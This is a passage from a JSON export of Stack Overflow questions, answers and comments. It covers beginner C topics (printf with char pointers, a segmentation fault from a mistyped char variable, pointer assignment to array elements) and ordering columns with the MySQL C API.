printf(pointer_name) enough to print the value of the pointer?</li>\n  </ol>\n</blockquote>\n\n<p><code>%c</code> is the character conversion specifier.  It instructs <code>printf</code> to only print the first byte.  If you want it to print the string, use...</p>\n\n<pre><code>printf (\"%s\", p);\n</code></pre>\n\n<p>The <code>%s</code> seems redundant, but it can be useful for printing control characters or if you use width specifiers.</p>\n\n<hr>\n\n<p>The best way to understand this really is to try and print the string <code>abc%def</code> using <code>printf</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 669, "user_id": 5076511, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WubM0.jpg?s=128&g=1", "display_name": "Fabulous", "link": "https://stackoverflow.com/users/5076511/fabulous"}, "edited": false, "score": 1, "creation_date": 1476285925, "post_id": 40002370, "comment_id": 67282632, "body": "@simrandhamija Given <code>printf(&quot;%d&quot;, 1)</code>, the <code>&quot;%d&quot;</code> is the format string."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 2, "last_activity_date": 1476285637, "creation_date": 1476285637, "answer_id": 40002370, "question_id": 40002185, "link": "https://stackoverflow.com/questions/40002185/char-pointers-and-the-printf-function/40002370#40002370", "title": "Char pointers and the printf function", "body": "<blockquote>\n  <p>why did printf not require a format specifier in the second case? Is printf(pointer_name) enough to print the value of the pointer?</p>\n</blockquote>\n\n<p>With your code you told printf to use your string as the format string. Meaning your code turned equivalent to <code>printf(\"abc\")</code>.</p>\n\n<blockquote>\n  <p>as per my understanding (which is very little), *p points to a contiguous block of memory that contains abc. I expected both outputs to be the same</p>\n</blockquote>\n\n<p>If you use <code>%c</code> you get a character printed, if you use <code>%s</code> you get a whole string. But if you tell printf to use the string as the format string, then it will do that too. </p>\n\n<p><code>char *p = \"abc\";\n    printf(*p);</code></p>\n\n<p>This code crashes because the contents of <code>p</code>, the character <code>'a'</code> is not a pointer to a format string, it is not even a pointer. That code should not even compile without warnings.</p>\n"}, {"comments": [{"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1476293104, "post_id": 40002442, "comment_id": 67287330, "body": "&quot;<i>means a byte</i>&quot; is means a <code>char</code>, a character will be printed out."}, {"owner": {"reputation": 324, "user_id": 6950051, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AoXcJ.png?s=128&g=1", "display_name": "Oskar Skog", "link": "https://stackoverflow.com/users/6950051/oskar-skog"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1476293269, "post_id": 40002442, "comment_id": 67287424, "body": "The word &quot;character&quot; is ambiguous, is it a unsigned integer with a width of at least 8 bits or is it a (possibly encoded) Unicode code point.   Ex. &quot;&#229;&quot; in UTF-8 is one character/letter and two characters/bytes."}], "tags": [], "owner": {"reputation": 324, "user_id": 6950051, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AoXcJ.png?s=128&g=1", "display_name": "Oskar Skog", "link": "https://stackoverflow.com/users/6950051/oskar-skog"}, "is_accepted": false, "score": 8, "last_activity_date": 1476293959, "last_edit_date": 1476293959, "creation_date": 1476285817, "answer_id": 40002442, "question_id": 40002185, "link": "https://stackoverflow.com/questions/40002185/char-pointers-and-the-printf-function/40002442#40002442", "title": "Char pointers and the printf function", "body": "<ol>\n<li><p><code>p</code> is the format string.</p>\n\n<pre><code>char *p = \"abc\";\nprintf(p);\n</code></pre>\n\n<p>is the same as</p>\n\n<pre><code>print(\"abc\");\n</code></pre>\n\n<p>Doing this is very bad practice because you don't know what the variable\nwill contain, and if it contains format specifiers, calling <code>printf</code> may do very bad things.</p></li>\n<li><p>The reason why the first case (with <code>\"%c\"</code>) only printed the first character\nis that <code>%c</code> means a byte and <code>*p</code> means the (first) value which <code>p</code> is pointing at.</p>\n\n<p><code>%s</code> would print the entire string.</p>\n\n<pre><code>char *p = \"abc\";\nprintf(p); /* If p is untrusted, bad things will happen, otherwise the string p is written. */\nprintf(\"%c\", *p); /* print the first byte in the string p */\nprintf(\"%s\", p); /* print the string p */\n</code></pre></li>\n</ol>\n"}], "owner": {"reputation": 669, "user_id": 5076511, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WubM0.jpg?s=128&g=1", "display_name": "Fabulous", "link": "https://stackoverflow.com/users/5076511/fabulous"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72556, "favorite_count": 8, "accepted_answer_id": 40002265, "answer_count": 6, "score": 13, "last_activity_date": 1476293959, "creation_date": 1476285144, "last_edit_date": 1476293292, "question_id": 40002185, "link": "https://stackoverflow.com/questions/40002185/char-pointers-and-the-printf-function", "title": "Char pointers and the printf function", "body": "<p>I was trying to learn pointers and I wrote the following code to print the value of the pointer:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n    int main(void) {\n        char *p = \"abc\";\n        printf(\"%c\",*p);\n        return 0;\n    }\n</code></pre>\n\n<p>The output is:</p>\n\n<blockquote>\n  <p>a</p>\n</blockquote>\n\n<p>however, if I change the above code to:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    char *p = \"abc\";\n    printf(p);\n    return 0;\n}\n</code></pre>\n\n<p>I get the output:</p>\n\n<blockquote>\n  <p>abc</p>\n</blockquote>\n\n<p>I don't understand the following 2 things:</p>\n\n<ol>\n<li><p>why did printf not require a format specifier in the second case? Is <code>printf(pointer_name)</code> enough to print the value of the pointer?</p></li>\n<li><p>as per my understanding (which is very little), *p points to a contiguous block of memory that contains <code>abc</code>. I expected both outputs to be the same, i.e. </p></li>\n</ol>\n\n<blockquote>\n  <p>abc</p>\n</blockquote>\n\n<p>are the different outputs because of the different ways of printing?</p>\n\n<p><strong>Edit 1</strong></p>\n\n<p>Additionally, the following code produces a runtime error. Why so?</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n\n    int main(void) {\n        char *p = \"abc\";\n        printf(*p);\n        return 0;\n    }\n</code></pre>\n"}, {"tags": ["c", "pointers", "pass-by-reference"], "comments": [{"owner": {"reputation": 2375, "user_id": 3985859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34af6d164c53c629e625c11a3d11bbcc?s=128&d=identicon&r=PG&f=1", "display_name": "Karsten Koop", "link": "https://stackoverflow.com/users/3985859/karsten-koop"}, "edited": false, "score": 2, "creation_date": 1476285295, "post_id": 40002169, "comment_id": 67282151, "body": "The statement <code>tmpStr[strlen(tmpStr)-1] = &#39;\\0&#39;</code> does not make sense, <code>strlen</code> calculates the length of the string by searching for the 0, and then you place a 0 where there already was one. Maybe you meant  <code>tmpStr[MAX_STR-1] = &#39;\\0&#39;</code>?"}, {"owner": {"reputation": 1, "user_id": 6843462, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/54b02cebf86093608ce20671925ea7f7?s=128&d=identicon&r=PG&f=1", "display_name": "DirtOnYourJhin", "link": "https://stackoverflow.com/users/6843462/dirtonyourjhin"}, "reply_to_user": {"reputation": 2375, "user_id": 3985859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34af6d164c53c629e625c11a3d11bbcc?s=128&d=identicon&r=PG&f=1", "display_name": "Karsten Koop", "link": "https://stackoverflow.com/users/3985859/karsten-koop"}, "edited": false, "score": 0, "creation_date": 1476285337, "post_id": 40002169, "comment_id": 67282173, "body": "That was not made by me, but the prof. I can&#39;t alter it either way"}, {"owner": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "reply_to_user": {"reputation": 2375, "user_id": 3985859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34af6d164c53c629e625c11a3d11bbcc?s=128&d=identicon&r=PG&f=1", "display_name": "Karsten Koop", "link": "https://stackoverflow.com/users/3985859/karsten-koop"}, "edited": false, "score": 0, "creation_date": 1476286054, "post_id": 40002169, "comment_id": 67282733, "body": "@KarstenKoop Actually it&#39;s stripping the trailing <code>\\n</code> which fgets() will store. So it does make sense, ugly as it is."}, {"owner": {"reputation": 2375, "user_id": 3985859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34af6d164c53c629e625c11a3d11bbcc?s=128&d=identicon&r=PG&f=1", "display_name": "Karsten Koop", "link": "https://stackoverflow.com/users/3985859/karsten-koop"}, "edited": false, "score": 0, "creation_date": 1476286150, "post_id": 40002169, "comment_id": 67282807, "body": "You are right, <code>tmpStr[strlen(tmpStr)-1]</code> is the last character of the string, not the terminating 0. Off-by-one error by me"}, {"owner": {"reputation": 6553, "user_id": 3524982, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5NAb1.png?s=128&g=1", "display_name": "James", "link": "https://stackoverflow.com/users/3524982/james"}, "edited": false, "score": 2, "creation_date": 1476332348, "post_id": 40002169, "comment_id": 67302168, "body": "Please do not vandalize your own posts."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1476332855, "post_id": 40002169, "comment_id": 67302320, "body": "<code>char t = movie.title;</code> is an error. Your compiler should say something about this. It&#39;s important to fix all messages reported by the compiler before running your program."}], "answers": [{"comments": [{"owner": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 1, "creation_date": 1476285733, "post_id": 40002263, "comment_id": 67282479, "body": "+1, and the format string will then need to be <code>%s</code> not <code>%c</code>, and the varargs arguments don&#39;t need to be in brackets like Python."}], "tags": [], "owner": {"reputation": 5956, "user_id": 1249472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5e7d2ac9163237829d11cbf4ee7d563d?s=128&d=identicon&r=PG", "display_name": "Nikita", "link": "https://stackoverflow.com/users/1249472/nikita"}, "is_accepted": false, "score": 1, "last_activity_date": 1476285376, "creation_date": 1476285376, "answer_id": 40002263, "question_id": 40002169, "link": "https://stackoverflow.com/questions/40002169/segmentation-fault-in-c-in-my-code-in-linux/40002263#40002263", "title": "Segmentation Fault in C in my code in linux", "body": "<p>You are passing <code>char t = movie.title;</code> into <code>readString(t);</code>. It's incorrect. <code>readString</code> expects a pointer <code>char*</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 7008793, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a6d92e083eb8c54cf8e96021066f742?s=128&d=identicon&r=PG", "display_name": "malcolm hartley", "link": "https://stackoverflow.com/users/7008793/malcolm-hartley"}, "is_accepted": false, "score": 1, "last_activity_date": 1476321451, "last_edit_date": 1476321451, "creation_date": 1476285922, "answer_id": 40002478, "question_id": 40002169, "link": "https://stackoverflow.com/questions/40002169/segmentation-fault-in-c-in-my-code-in-linux/40002478#40002478", "title": "Segmentation Fault in C in my code in linux", "body": "<p>Got it.\nSo basically there was two different issues.</p>\n\n<ol>\n<li><p>Like the first guy said you were using <code>char t = movie.title;</code> when you should of been using <code>char* t = movie.title;</code></p></li>\n<li><p>In: <code>printf(\"The title of the movie is: %c\\n\", (t));</code> you should have been using <code>%s</code> not <code>%c</code>. So like this: <code>printf(\"The title of the movie is: %s\\n\", (t));</code></p></li>\n</ol>\n\n<p>Good luck on your assignment. I compiled using Mac OS X but it should work on linux.</p>\n"}], "owner": {"reputation": 1, "user_id": 6843462, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/54b02cebf86093608ce20671925ea7f7?s=128&d=identicon&r=PG&f=1", "display_name": "DirtOnYourJhin", "link": "https://stackoverflow.com/users/6843462/dirtonyourjhin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 1, "closed_date": 1476334034, "answer_count": 2, "score": -1, "last_activity_date": 1476332342, "creation_date": 1476285093, "last_edit_date": 1476332342, "question_id": 40002169, "link": "https://stackoverflow.com/questions/40002169/segmentation-fault-in-c-in-my-code-in-linux", "closed_reason": "Duplicate", "title": "Segmentation Fault in C in my code in linux", "body": "<p>I'm just learning pointers in C now, and Im confused as to how they would work in my code:</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;string.h&gt;\n\n\n    #define MAX_ARR  64\n    #define MAX_STR  32\n\n    typedef enum { COMEDY, DRAMA, HORROR, SCIFI \n    } GenreType;\n\n    typedef struct {\n      char title[MAX_STR];\n      char director[MAX_STR];\n      int  year;\n      GenreType genre;\n    } MovieType;\n\n    void initMovie(char*, char*, int*, GenreType, MovieType*);\n    void printMovies(MovieType*, int);\n    void readString(char*);\n    void readInt(int*);\n\n\n    int main()\n    {\n       MovieType movie;\n       MovieType movieArr[MAX_ARR];\n       MovieType *pMovie;\n       char t = movie.title;\n       int arrSize = 0;\n\n       printf(\"Please enter the tile of the movie: \");\n       readString(t);\n       printf(\"The title of the movie is: %c\\n\", (t));\n\n       return 0;\n    }\n\nvoid initMovie(char *t, char *d, int *y, GenreType gentype, MovieType *movType)\n{\n\n}\n\nvoid readString(char *str)\n{\n  char tmpStr[MAX_STR];\n\n  fgets(tmpStr, sizeof(tmpStr), stdin);\n  tmpStr[strlen(tmpStr)-1] = '\\0';\n  strcpy(str, tmpStr);\n}\n\nvoid readInt(int *x)\n{\n  char str[MAX_STR];\n\n  readString(str);\n  sscanf(str, \"%d\", x);\n}\n</code></pre>\n\n<p>I'm trying to ask the user to fill in all the data of the movie types such as <code>title</code>, <code>director</code>, <code>year</code> it came out etc. As you can see, my current method produces a <code>segmentation fault</code>, so clearly I'm doing something wrong. Everything outside of the <code>main</code> function cannot be altered, except for the <code>initMovie</code> function and the <code>printMovies</code> function (not yet made).</p>\n\n<p>Any tips and pointers, pun intended, would be greatly appreciated! Let me know what I'm doing wrong and how I can fix it!</p>\n"}, {"tags": ["c", "memory", "heap-memory"], "comments": [{"owner": {"reputation": 9460, "user_id": 3588973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/11G8Y.jpg?s=128&g=1", "display_name": "Droppy", "link": "https://stackoverflow.com/users/3588973/droppy"}, "edited": false, "score": 4, "creation_date": 1476284110, "post_id": 40001802, "comment_id": 67281335, "body": "That will crash.  You want <code>p = &amp;array[3];</code> or <code>p = array + 3;</code>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1476284212, "post_id": 40001802, "comment_id": 67281416, "body": "<a href=\"http://stackoverflow.com/questions/562303/the-definitive-c-book-guide-and-list\">Find a good beginners book</a> and read the chapters on arrays and pointers."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1476285078, "post_id": 40001802, "comment_id": 67282006, "body": "&quot;I understand that the pointer p initially points to the 3rd element of the array&quot;. No. Your attempt to assign a value to <code>p</code> is simply invalid."}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476285470, "post_id": 40001882, "comment_id": 67282257, "body": "&quot;the address of <code>p</code>&quot; is <code>&amp;p</code>. You mean &quot;to the address <code>p</code> points to&quot;. That is basic stuff one finds in any tutorial. The cast is problematic and a properly augmented compiler should actually warn about that assignment. Note: use markdown consistently."}, {"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476336119, "post_id": 40001882, "comment_id": 67303308, "body": "@Olaf I&#39;m sry, thats what I meant... Just formulated it wrong"}], "tags": [], "owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "is_accepted": false, "score": 0, "last_activity_date": 1476336147, "last_edit_date": 1476336147, "creation_date": 1476284287, "answer_id": 40001882, "question_id": 40001802, "link": "https://stackoverflow.com/questions/40001802/c-language-pointer-memory/40001882#40001882", "title": "C Language Pointer Memory?", "body": "<p><code>*p = (int) *c;</code></p>\n\n<p><code>*c</code> means that you take the value at the address of c </p>\n\n<p><code>(int)</code> casts it to an int</p>\n\n<p><code>*p=</code> writes to the address <code>p</code> points to</p>\n\n<p>So if you fix what droppy said, there will be the numerical value of <code>c[0]</code> in the 3rd part of <code>array</code></p>\n\n<p>so it would be <code>1,2,65,4,5</code></p>\n"}, {"tags": [], "owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "is_accepted": false, "score": 0, "last_activity_date": 1476284479, "creation_date": 1476284479, "answer_id": 40001955, "question_id": 40001802, "link": "https://stackoverflow.com/questions/40001802/c-language-pointer-memory/40001955#40001955", "title": "C Language Pointer Memory?", "body": "<ol>\n<li><p>You should use 'p = &amp;array[3];'. The pointer will then point to the third element of the array i.e. 'C'</p></li>\n<li><p><code>*p = (int) *c;</code></p></li>\n</ol>\n\n<p><code>c[size]</code> is an array. <code>c</code> is the base pointer of the array. so <code>*c</code> is the value at the base pointer which is <code>'A'</code>. This statement will put <code>'A'</code> in the third element of the array. So the array now contains <code>A, B, A, D, E</code></p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 0, "last_activity_date": 1476289628, "creation_date": 1476289628, "answer_id": 40003698, "question_id": 40001802, "link": "https://stackoverflow.com/questions/40001802/c-language-pointer-memory/40003698#40003698", "title": "C Language Pointer Memory?", "body": "<pre><code>p = array[3]; // int * = int\n</code></pre>\n\n<p>is an error; the types don't match, and the compiler will yell at you for it.  The type of <code>p</code> is <code>int *</code>, and the type of <code>array[3]</code> is <code>int</code>.  </p>\n\n<p>There are two ways to fix this, depending on what you want to do.  If you want to set <code>p</code> to <em>point</em> to <code>array[3]</code> (which is what you want to do in this case), you would write</p>\n\n<pre><code>p = &amp;array[3]; // int * = int *\n</code></pre>\n\n<p>If you want to write the <em>value</em> of <code>array[3]</code> to the object that <code>p</code> points to (which is <em>not</em> what you want to do in this case, since <code>p</code> isn't pointing anywhere valid yet), you would write</p>\n\n<pre><code>*p = array[3]; // int = int\n</code></pre>\n\n<p>In this case, we want to set <code>p</code> to point to <code>array[3]</code>, so we use the first statement.  After doing that, the following are true:</p>\n\n<pre><code> p == &amp;array[3]          // int *\n*p ==  array[3] == 2     // int\n</code></pre>\n\n<p>Now we have the statement</p>\n\n<pre><code>*p = (int) *c;\n</code></pre>\n\n<p>is saying \"take the value of the <code>char</code> object that <code>c</code> points to, convert it to an <code>int</code> value<sup>1</sup>, and assign the result to the object that <code>p</code> points to.\"  </p>\n\n<p>Except when it is the operand of the <code>sizeof</code> or unary <code>&amp;</code> operators, or is a string literal being used to initialize an array of <code>char</code> in a declaration, an <em>expression</em> of type \"N-element array of <code>T</code>\" will be converted (\"decay\") to an expression of type \"pointer to <code>T</code>\", and the value of the expression will be the address of the first element of the array.</p>\n\n<p>The <em>expression</em> <code>c</code> has type \"5-element array of <code>char</code>\".  Since it is not the operand of the <code>sizeof</code> or unary <code>&amp;</code> operators, it is converted to an expression of type <code>char *</code>, and the value of the expression is the address of the first element in the array, <code>c[0]</code>.  Thus:</p>\n\n<pre><code> c == &amp;c[0]                         // char *\n*c ==  c[0] == 'A' == 65 (ASCII)    // char\n</code></pre>\n\n<p>Taking all that together, that means</p>\n\n<pre><code>*p = (int) *c;\n</code></pre>\n\n<p>is another way of writing</p>\n\n<pre><code>*p = (int) c[0];\n</code></pre>\n\n<p>which is another way of writing</p>\n\n<pre><code>array[3] = (int) c[0];\n</code></pre>\n\n<p>which is another way of writing</p>\n\n<pre><code>array[3] = (int) 'A';\n</code></pre>\n\n<p>which is another way of writing</p>\n\n<pre><code>array[3] = 65;\n</code></pre>\n\n<p><hr>\n<sup></p>\n\n<ol>\n<li><code>(int)</code> is a <em>cast expression</em>; it means that the value following it should be treated as type <code>int</code>. \n</ol> \n\n<p></sup></p>\n"}], "owner": {"reputation": 47, "user_id": 5573833, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2ca62c1ae93301ee7747cff9fb235f3?s=128&d=identicon&r=PG&f=1", "display_name": "mustardtiger10", "link": "https://stackoverflow.com/users/5573833/mustardtiger10"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 91, "favorite_count": 1, "answer_count": 3, "score": 0, "last_activity_date": 1476336147, "creation_date": 1476284035, "last_edit_date": 1476287187, "question_id": 40001802, "link": "https://stackoverflow.com/questions/40001802/c-language-pointer-memory", "title": "C Language Pointer Memory?", "body": "<pre><code>int num = 78;\nint *p;\n\nint array[SIZE] = {0,1,2,3,4};\nchar c[SIZE] = {'A', 'B', 'C', 'D', 'E'};\n\np = array[3];\n*p = (int) *c;\np++;\narray[4] = num;\np++;\np = c;\np++;\n</code></pre>\n\n<p>I'm trying to figure out the memory behind this above code. I understand that the pointer p initially points to the 3rd element of the array(which is 3). I have no idea what the next line *p = (int) *c; means. Can anyone please explain that line of code??</p>\n\n<p>Edit:\nAfter the p is incremented as such can anyone explain what it would be pointing to? </p>\n"}, {"tags": ["mysql", "sql", "c", "mysql-connector"], "comments": [{"owner": {"reputation": 724, "user_id": 4873907, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/744993b2ee1d447ea162c90a0e2e8af0?s=128&d=identicon&r=PG&f=1", "display_name": "Francis Straccia", "link": "https://stackoverflow.com/users/4873907/francis-straccia"}, "edited": false, "score": 0, "creation_date": 1476284471, "post_id": 40001650, "comment_id": 67281600, "body": "Who voted for <i>close</i> could and should explain why he/she did so and how to improve the question."}, {"owner": {"reputation": 6114, "user_id": 3070060, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a936bdd7a67a345d312281305d5adde?s=128&d=identicon&r=PG&f=1", "display_name": "PaulF", "link": "https://stackoverflow.com/users/3070060/paulf"}, "edited": false, "score": 0, "creation_date": 1476284668, "post_id": 40001650, "comment_id": 67281724, "body": "A better idea of what you are trying to achieve may help. Maybe, you could use the mysql_fetch_fields function to associate column name with column number."}, {"owner": {"reputation": 29839, "user_id": 487813, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/lU5if.jpg?s=128&g=1", "display_name": "apokryfos", "link": "https://stackoverflow.com/users/487813/apokryfos"}, "edited": false, "score": 0, "creation_date": 1476285017, "post_id": 40001650, "comment_id": 67281960, "body": "No, there isn&#39;t. The order is as specified in the <code>SELECT &lt;here&gt;</code> part of the query. If no order is specified in the query then you can assume it&#39;s arbitrary (although it&#39;s probably the create order)."}, {"owner": {"reputation": 724, "user_id": 4873907, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/744993b2ee1d447ea162c90a0e2e8af0?s=128&d=identicon&r=PG&f=1", "display_name": "Francis Straccia", "link": "https://stackoverflow.com/users/4873907/francis-straccia"}, "reply_to_user": {"reputation": 6114, "user_id": 3070060, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a936bdd7a67a345d312281305d5adde?s=128&d=identicon&r=PG&f=1", "display_name": "PaulF", "link": "https://stackoverflow.com/users/3070060/paulf"}, "edited": false, "score": 0, "creation_date": 1476285177, "post_id": 40001650, "comment_id": 67282079, "body": "@PaulF: I just edited the question as per your suggestion. Hope it&#39;s clearer now."}, {"owner": {"reputation": 6114, "user_id": 3070060, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a936bdd7a67a345d312281305d5adde?s=128&d=identicon&r=PG&f=1", "display_name": "PaulF", "link": "https://stackoverflow.com/users/3070060/paulf"}, "edited": false, "score": 0, "creation_date": 1476286049, "post_id": 40001650, "comment_id": 67282728, "body": "Can&#39;t you just create a list of constants &amp; use those - assign them at the point where you create the query string &amp; modify if you update the query. e.g const int col_Aa=0; const int col_Ab=1; ....... int field1 = atoi(row[col_Aa]); memcpy(row[col_Ab], field2, lengths[col_Ab]);"}], "answers": [{"tags": [], "owner": {"reputation": 1137, "user_id": 2178980, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NwxMq.jpg?s=128&g=1", "display_name": "Eugene", "link": "https://stackoverflow.com/users/2178980/eugene"}, "is_accepted": false, "score": 0, "last_activity_date": 1517413047, "last_edit_date": 1517413047, "creation_date": 1476288363, "answer_id": 40003274, "question_id": 40001650, "link": "https://stackoverflow.com/questions/40001650/rearranging-column-order-in-select-statement-on-mysql/40003274#40003274", "title": "Rearranging column order in SELECT statement on MySql", "body": "<p>It's been a long time since I've coded <a href=\"/questions/tagged/c\" class=\"post-tag\" title=\"show questions tagged &#39;c&#39;\" rel=\"tag\">c</a>, and I'm sorry to answer and not comment (<em>not enough points</em>), but perhaps <a href=\"http://dev.mysql.com/doc/refman/5.7/en/mysql-fetch-field-direct.html\" rel=\"nofollow noreferrer\"><strong><code>mysql_fetch_field_direct()</code></strong></a> might be of help?</p>\n"}, {"tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 0, "last_activity_date": 1476290313, "creation_date": 1476290313, "answer_id": 40003895, "question_id": 40001650, "link": "https://stackoverflow.com/questions/40001650/rearranging-column-order-in-select-statement-on-mysql/40003895#40003895", "title": "Rearranging column order in SELECT statement on MySql", "body": "<p>I'm not sure what you want, but maybe this works:</p>\n\n<pre><code>SELECT A.a AS 1, A.b AS 2, A.c AS 3 FROM tbl1 A INNER JOIN tbl2 B ON B.id = A.B_id\n</code></pre>\n\n<p>This returns the fields you want with names \"1\", \"2\", \"3\" etcetera. (I am not sure if numeral-only column names are accepted.)</p>\n"}], "owner": {"reputation": 724, "user_id": 4873907, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/744993b2ee1d447ea162c90a0e2e8af0?s=128&d=identicon&r=PG&f=1", "display_name": "Francis Straccia", "link": "https://stackoverflow.com/users/4873907/francis-straccia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1917, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1517413047, "creation_date": 1476283618, "last_edit_date": 1495541894, "question_id": 40001650, "link": "https://stackoverflow.com/questions/40001650/rearranging-column-order-in-select-statement-on-mysql", "title": "Rearranging column order in SELECT statement on MySql", "body": "<p>I'm using the MySql C API and doing various queries I found it very inconvenient to go check the query each time to see the column ordering. Moreover, this approach is very prone to errors in case of a query edit.</p>\n\n<p><strong>Is there anything I can do to assign by query each column ordinal?</strong></p>\n\n<p>If not, is there a more convenient way to retrieve results via the C API? (currently using <code>mysql_fetch_row</code> and accessing the column id with the subscript operator).</p>\n\n<p>Please not that I read the similar question <a href=\"https://stackoverflow.com/questions/34583349/is-it-possible-to-sort-the-order-in-which-columns-are-returned-in-a-mysql-select\">Is it possible to sort the order in which columns are returned in a mysql SELECT 